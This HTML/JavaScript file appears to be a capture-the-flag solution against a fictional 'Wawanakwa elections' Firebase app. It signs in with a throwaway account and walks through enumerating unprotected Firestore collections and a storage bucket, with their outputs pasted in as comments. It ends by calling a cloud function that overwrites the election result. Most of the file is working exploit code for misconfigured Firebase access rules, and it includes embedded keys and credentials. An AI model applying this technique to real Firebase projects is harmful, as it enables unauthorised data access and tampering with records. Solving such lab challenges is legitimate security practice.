<html>
    <head>
    <!-- Import Firebase Scripts -->
        <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-auth.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-firestore.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-functions.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-storage.js"></script>
    </head>
</html>

<body>
    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyDUOa5rtOnbVbF7T7ivUeBBR78L2tkODmY",
            authDomain: "official-wawanakwa-elections.firebaseapp.com",
            databaseURL: "https://official-wawanakwa-elections.firebaseio.com",
            projectId: "official-wawanakwa-elections",
            storageBucket: "official-wawanakwa-elections.appspot.com",
            messagingSenderId: "95856642143",
            appId: "1:95856642143:web:8b7fd33b805fadf104f3ea"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }

        async function win() {
            // Login with auth
            //var email = makeid(8) + '@gmail.com';
            var email = 'l3o+kuhi.to@maildrop.cc'
            // After email verified, we sign in instead of create user
            //await firebase.auth().createUserWithEmailAndPassword(email, "leoleo");
            await firebase.auth().signInWithEmailAndPassword(email, "leoleo");
            
            /* Get Stats
            firebase.firestore().collection("stats").get().then((res) => {
                res.docs.map((doc) => {
                    console.log(doc.id);
                    firebase.firestore().collection("stats").doc(doc.id).get().then((res) => {
                        console.log(res.data());
                    })
                })
            });
            */

            /*
            {
            "winner":"[redacted]",
            "note_to_admin":"restrict access to the '/secret' collection",
            "winner_party":"[redacted]"
            }
            {
            "winner_party":"The Pink Party",
            "winner":"Chris McLean"
            }
            */


            /* Access Secret
            firebase.firestore().collection("secret").get().then((res) => {
                res.docs.map((doc) => {
                    console.log(doc.id)
                    firebase.firestore().collection("secret").doc(doc.id).get().then((res) => {
                        console.log(res.data())
                    })
                })
            });
            */

            /*
            {
            "comment":"Backups are kept in the project's default bucket. Hail Hydra!"
            }
            */

            /* List objects in bucket
            firebase.storage().ref().listAll().then((r) => {
                r.items.forEach((i) => {
                    console.log(`${i.name} -> ${i.bucket}`)
                })
            })
            */

            /*
            ArrayOfPower:) -> official-wawanakwa-elections.appspot.com
            WhyCanIWriteToThisDir?.bat -> official-wawanakwa-elections.appspot.com
            index.js -> official-wawanakwa-elections.appspot.com
            */


            /* Extract reference url of index.js
            r = firebase.storage().ref().child('index.js');
            r.getDownloadURL().then((u) => {
                console.log(u)
            });
            */
            
            /*
            https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o/index.js?alt=media&token=bf68a747-6948-43ac-b976-9fa1e74b2e3d
            */

            // Verify email address
            // firebase.auth().currentUser.sendEmailVerification();
            
            firebase.functions().httpsCallable('setResults2020')({"winner_party":"The Orange Party"}).then((r) => {
                console.log(r.data);
            });
            

        }
        win();
        

        </script>
</body>